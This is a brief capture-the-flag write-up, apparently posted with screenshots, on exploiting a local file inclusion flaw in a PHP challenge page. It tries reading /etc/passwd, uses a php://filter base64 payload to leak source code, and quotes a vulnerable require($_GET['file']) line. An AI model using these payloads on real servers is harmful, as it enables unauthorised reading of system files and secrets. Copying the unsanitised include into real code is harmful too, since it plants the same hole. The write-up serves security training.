# Hi
![image](https://user-images.githubusercontent.com/65381453/136799617-632b1584-6996-4b86-94e9-f6edf07480f5.png)

![image](https://user-images.githubusercontent.com/65381453/136799649-40d1a28c-1f67-4d4e-844a-762d6f140b14.png)

i see it, just simple page, 

i thinks its LFI , try /etc/passwd

![image](https://user-images.githubusercontent.com/65381453/136799743-d6ec2f79-30d8-47cb-b798-6434e1da21c8.png)

but i can't know file have flag, then i see index.php ,

![image](https://user-images.githubusercontent.com/65381453/136800262-73e70350-d063-4248-83b7-1cbcc0d530b1.png)

error

php://filter/convert.base64-encode/resource=

![image](https://user-images.githubusercontent.com/65381453/136808473-e083df29-25a6-4c14-aa85-e159d7737e33.png)

base64decode and get plant text

```
<?php

if(!isset($_GET["file"])){
    header("location: http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html");
    exit;
}

else{
    require($_GET['file']);
}

#note to myself: delete /bin/secrets.txt!
?>
```

oh, i see /bin/secrets.txt , lets try read

![image](https://user-images.githubusercontent.com/65381453/136808648-dfcedfd3-20ed-4fa4-8871-8b9565383c72.png)

